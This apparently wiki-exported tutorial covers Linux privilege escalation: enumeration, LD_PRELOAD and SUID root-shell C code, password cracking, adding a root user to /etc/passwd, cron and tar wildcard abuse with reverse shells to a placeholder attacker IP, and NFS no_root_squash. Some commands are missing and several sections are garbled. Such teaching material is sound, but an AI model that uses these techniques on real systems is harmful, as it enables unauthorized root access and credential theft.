# Linux Privilege Escalation

**What is Privilege Escalation?**[**​**](broken-reference)

It's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

### Enumeration[​](broken-reference) <a href="#enumeration" id="enumeration"></a>

Enumeration is the first step you have to take once you gain access to any system.

**hostname**[**​**](broken-reference)

The `hostname` command will return the hostname of the target machine.

**uname -a**[**​**](broken-reference)

Will print system information giving us additional detail about the kernel used by the system. Is useful when searching for any potential kernel vulnerabilities.

**/proc/version**[**​**](broken-reference)

The proc filesystem (procfs) provides information about the target system processes and may give information on the kernel version and compilers.

**/etc/issue**[**​**](broken-reference)

This file usually contains some information about the operating system but can easily be customized or changes, but is always good to look at all of these.

**ps Command**[**​**](broken-reference)

The `ps` command (Process Status) is an effective way to see the running processes on a Linux system and will show:

* PID: The process ID (unique to the process)
* TTY: Terminal type used by the user
* Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
* CMD: The command or executable running (will NOT display any command line parameter)

Some options of `ps` are:

* `ps -A`: View all running processes
* `ps axjf`: View process tree
* `ps aux`: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x).

**env**[**​**](broken-reference)

The `env` command will show environmental variables. The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

**sudo -l**[**​**](broken-reference)

The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

**ls**[**​**](broken-reference)

While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter.

**id**[**​**](broken-reference)

The `id` command will provide a general overview of the user’s privilege level and group memberships. It is worth remembering that can also be used to obtain the same information for another user, with `id <username>`.

**/etc/passwd**[**​**](broken-reference)

Reading the `/etc/passwd` file can be an easy way to discover users on the system. It can easily be cut and converted to a useful list for brute-force attacks.

```
cat /etc/passwd | cut -d ":" -f 1
```

Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

```
cat /etc/passwd | grep home
```

**history**[**​**](broken-reference)

Looking at earlier commands with the `history` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

**ifconfig**[**​**](broken-reference)

The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. This can be confirmed using the `ip route` command to see which network routes exist.

**netstat**[**​**](broken-reference)

The `netstat` command can be used with several different options to gather information on existing connections.

* `netstat -a`: shows all listening ports and established connections.
* `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
* `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol
* `netstat -s`: list network usage statistics by protocol. This can also be used with the -t or -u options to limit the output to a specific protocol.
* `netstat -tp`: list connections with the service name and PID information. This can also be used with the `-l` option to list listening ports
* `netstat -i`: Shows interface statistics.
* `netstat -ano`
  * `-a`: Display all sockets
  * `-n`: Do not resolve names
  * `-o`: Display timers

**find Command**[**​**](broken-reference)

Find files:

* `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
* `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
* `find / -type d -name config`: find the directory named config under “/”
* `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
* `find / -perm a=x`: find executable files
* `find /home -user frank`: find all files for user “frank” under “/home”
* `find / -mtime 10`: find files that were modified in the last 10 days
* `find / -atime 10`: find files that were accessed in the last 10 day
* `find / -cmin -60`: find files changed within the last hour (60 minutes)
* `find / -amin -60`: find files accesses within the last hour (60 minutes)
* `find / -size 50M`: find files with a 50 MB size. This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

It is important to note that the `find` command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the `find` command with `-type f 2>/dev/null` to redirect errors to `/dev/null` and have a cleaner output.

Folders and files that can be written to or executed from:

* `find / -writable -type d 2>/dev/null`: Find world-writeable folders
* `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
* `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
* `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders

Find development tools and supported languages:

* `find / -name perl*`
* `find / -name python*`
* `find / -name gcc*`

Find specific file permissions: This is a short example used to find files that have the SUID bit set:

```
find / -perm -u=s -type f 2>/dev/null
```

**General Linux Commands**[**​**](broken-reference)

As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, `etc`.

* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

### Kernel Exploits[​](broken-reference) <a href="#kernel-exploits" id="kernel-exploits"></a>

The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

**Research sorces:**[**​**](broken-reference)

Sources such as [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) can be useful.

### Sudo[​](broken-reference) <a href="#sudo" id="sudo"></a>

Any user can check its current situation related to root privileges using the `sudo -l` command. [https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

**Leverage application functions**[**​**](broken-reference)

Some application, like Apache2 server, supports loading alternative configuration files `-f`. Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

**Leverage LD\_PRELOAD**[**​**](broken-reference)

On some systems, you may see the LD\_PRELOAD environment option after usidn `sudo -l`. If the "env\_keep+=LD\_PRELOAD" option is enabled we can generate a shared library wich will be loaded and executed before the program is run. Note the LD\_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD\_PRELOAD (with the env\_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD\_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

We can now use this shared object file when launching any program our user can run with sudo, like find. We need to run the program by specifying the LD\_PRELOAD option, as follows;

```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This will result in a shell spawn with root privileges.

### SUID[​](broken-reference) <a href="#suid" id="suid"></a>

Files can have read, write, and execute permissions. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively. These files have an “s” bit set showing their special permission level.

```
find / -type f -perm -04000 -ls 2>/dev/null
```

A good practice would be to compare the listed executables with [GTFOBins](https://gtfobins.github.io/). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set.

#### Examples:[​](broken-reference) <a href="#examples" id="examples"></a>

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.

**Reading the /etc/shadow file**[**​**](broken-reference)

We see that a text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command, i.e. nano. `nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.

The unshadow tool’s usage can be seen below;

```
unshadow passwd.txt shadow.txt > passwords.txt
```

After that, with a little luck, John the Ripper can return one or several passwords in cleartex:

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt passwords.txt
```

**Add a new user that has root privileges**[**​**](broken-reference)

This would help us circumvent the tedious process of password cracking. We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

```
openssl passwd -1 -salt SALTEXAMPLE Passwordexample
$1$SALTEXAM$p9Vj22PddGO65/95KK9GA0
```

We will then add this password with a username to the `/etc/passwd` file.

```
usuariodeprueba:$1$SALTEXAM$p9Vj22PddGO65/95KK9GA0:0:0:root:/root:/bin/bash
```

We will need to switch to this user and hopefully should have root privileges.

### Capabilities[​](broken-reference) <a href="#capabilities" id="capabilities"></a>

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user. The capabilities man page provides detailed information on its usage and options.

We can use the `getcap` tool to list enabled capabilities. When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to `/dev/null`.

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

### Cron Jobs[​](broken-reference) <a href="#cron-jobs" id="cron-jobs"></a>

> Privilege Escalation Techniques. Learn the art of exploiting Windows and Linux systems

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Any user can read the file keeping system-wide cron jobs under `/etc/crontab`.

#### Escalation via cron paths[​](broken-reference) <a href="#escalation-via-cron-paths" id="escalation-via-cron-paths"></a>

Tis particular privilege escalation technique involves identifying the default $PATH variable that's been configured for cron jobs in the `crontab` file, generating a payload, and placing it in the path. Example:

```
SHELL=/bin/sh
PATH=/home/user:/usr/lobal/sbin:...continue
```

The $PATH variable is used to set the default path that the cron jobs will run from, unless specified otherwise.

Here, the $PATH variable has been set as the home directory of the user account. This means that, by default, all the cron jobs will run from the user account's home directory, unless specified otherwise. We can exploit this misconfiguration by identifying cron jobs that utilize scripts or binaries that are stored in the user account's home directory.

Analyzing the `crontab` file reveals an interesting cron job that runs a Bash script named `overwrite.sh` as the root user

```
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

The cron job has also been configured to run every 1 minute of every hour, every day, and every month. Now that we have identified a potential cron job that has the necessary requirements, we can begin the privilege escalation process:

1.  Te first step in this process involves locating and identifying the location of the `overwrite.sh` script that is run by the cron job. We were able to determine the default path used by the cron job is the user account's home directory. We can display the contents of the directory by running the following command:

    We are unable to locate the `overwrite.sh` script in the `user` home directory. This could be because the `root` user has not created the script yet.In any event, we can create the script ourselves and get it to provide us with a reverse shell with root privileges as the cron job will execute the script as the root user.
2.  We can create the `overwrite.sh` script and insert a Bash command that will provide us with a reverse shell. This can be done by running the following command in the `user` home directory:

    ```
    echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh
    ```

    This command will add a `bash` command that will connect to our reverse listener on the Kali Linux VM. Ensure that you replace the fields in the command with the respective IP address and port number.

    Once we have created this file, we need to set up a reverse listener with Netcat.
3. We can set up the reverse listener on the Kali VM by running the following command:

Ensure that you specify the port that you used in the `overwrite.sh` script. After setting up the listener, we will need to wait for a few minutes for the cron job to run. Once the cron job has been invoked, the `overwrite.sh` script will be executed. We should get a reverse shell on our listener with root privileges

With that, we have successfully elevated our privileges by leveraging a misconfiguration in the crontab `$PATH` variable. This allowed us to execute a custom command that provided us with an elevated reverse shell on the target system.

#### Escalation via cro wildcards[​](broken-reference) <a href="#escalation-via-cro-wildcards" id="escalation-via-cro-wildcards"></a>

This privilege escalation technique involves taking advantage of cron jobs that execute commands or scripts with wildcards. In the context of Linux, wildcards (\*) are used to perform more than one action at a time, and they can be used in a variety of different ways. In this section, we will explore how they can be exploited to execute malicious commands or scripts if misconfigured. The success of this technique will depend on whether or not wildcards have been utilized in cron jobs.

Follow these steps:

1.  The first step in this process involves identifying cron jobs that run commands or scripts with wildcards. Analyzing the crontab file reveals an interesting cron job that is responsible for creating and compressing backup archives:

    ```
    * * * * * root /usr/local/bin/compress.sh
    ```
2.  We can display the content of the compress.sh script by running the following command:

    ```
    cat /usr/local/bin/compress.sh
    ```

    The output is as follows:

    ```
    user@debian:~$ cat /usr/local/bin/compress.sh
    #!/bin/sh
    cd /home/user
    tar czf /tmp/backup.tar.gz *
    ```

    we can identify that the script is executed from the `user` account's home directory and that the files have been compressed with the `tar` utility. However, we can also identify a wildcard (\*) at the end of the `tar` command. The wildcard is used to specify all the files in the `user` account's home directory.
3. The `tar` utility has a checkpoint feature that is used to display progress messages after a specific set of files. It also allows users to define a specific action that is executed during the checkpoint. We can leverage this feature to execute a reverse shell payload that will provide us with an elevated session when executed.
4.  We can create the reverse shell script and insert a `bash` command that will provide us with a reverse shell. This can be done by running the following command in the user home directory:

    ```
    echo 'bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1' > shell.sh
    ```

    Now that we have created the file, we need to set up a reverse listener with Netcat.
5. We can set up the reverse listener on the Kali VM by running the following command:
6.  We can now set up our tar checkpoints in the user account's home directory. This can be done by running the following command on the target system:

    **tar checkpoints**[**​**](broken-reference)

    A checkpoint is a moment of time before writing nth record to the archive (a write checkpoint), or before reading nth record from the archive (a read checkpoint). Checkpoints allow to periodically execute arbitrary actions.

    The checkpoint facility is enabled using the following option:

    Schedule checkpoints before writing or reading each nth record. The default value for n is 10.

    A list of arbitrary actions can be executed at each checkpoint. These actions include: pausing, displaying textual messages, and executing arbitrary external programs. Actions are defined using the ‘--checkpoint-action’ option.

    ```
    --checkpoint-action=action
    ```

    ```
    touch /home/user/--checkpoint=1
    ```
7.  After setting up our checkpoint, we need to set up our checkpoint action. In this case, our checkpoint action will execute the `shell.sh` script, which will provide us with an elevated reverse shell. This can be done by running the following command:

    ```
    touch /home/user/--checkpoint-action=exec=sh\ shell.sh
    ```

    After setting up the tar checkpoint and checkpoint action, we need to wait a few minutes for the cron job to be invoked, after which we should receive an elevated reverse shell on our Netcat listener.

#### Escalation via cron file overwrites[​](broken-reference) <a href="#escalation-via-cron-file-overwrites" id="escalation-via-cron-file-overwrites"></a>

Another technique we can leverage to elevate our privileges is the ability to overwrite the content of scripts that are used by cron jobs. The success and viability of this technique will depend on whether we have thenecessary permissions to write or make changes to the script or file being runby the cron job.

This technique can be performed by following these steps:

1.  The first step in this process involves identifying a cron job that executes a script orbinary with read and write permissions as the root user. In this case, we can identifya cron job that runs the `overwrite.sh` script when invoked.

    ```
    * * * * * root overwrite.sh
    ```
2.  In this case, we do not find the `overwrite.sh` script in the user account's homedirectory. As a result, we can search for the script in the other directories specifiedin the `$PATH` variable. This can be done by listing the contents of each directory, as follows:

    ````
    ```
    ls -al /usr/local/bin | grep overwrite.sh
    ```

    Alternatively, you can use the locate utility to search for the overwrite.sh
    script by running the following command:
    ```
    locate overwrite.sh
    ```
    In this case, we will find the file under the `/usr/local/bin` directory.
    ````
3.  The next step involves identifying the permissions of the `overwrite.sh` todetermine whether we can make changes or overwrite the content of the script.

    ```
    ls -al /usr/local/bin | grep overwrite.sh
    ```

    In this case, we can determine that the script has read and write permissions. As aresult, we can make changes or overwrite the file with our own commands.
4.  Now, let's add a bash command that will provide us with a reverse shell to the overwrite.sh script.

    ```
    echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" >> /usr/local/bin/overwrite.sh
    ```
5.  Once we have appended the bash command, we will need to set up a reverse listener with Netcat.

    After appending the bash command to the overwrite.sh script, we will need towait for a few minutes for the cron job to be invoked.

### NFS[​](broken-reference) <a href="#nfs" id="nfs"></a>

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the “no\_root\_squash” option. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no\_root\_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.

We will mount one of the “no\_root\_squash” shares to our attacking machine and start building our executable.

```
mkdir /tmp/backupsonattackermachine
sudo mount -o rw <IP-DEST>:/backups /tmp/backupsonattackermachine
```

As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job.

```
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

Once we compile the code we will set the SUID bit.

```
gcc nfs.c -o nfs -w
chmod +s nfs
ls -l nfs
```

You will see that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them). Notice the nfs executable has the SUID bit set on the target system and runs with root privileges.
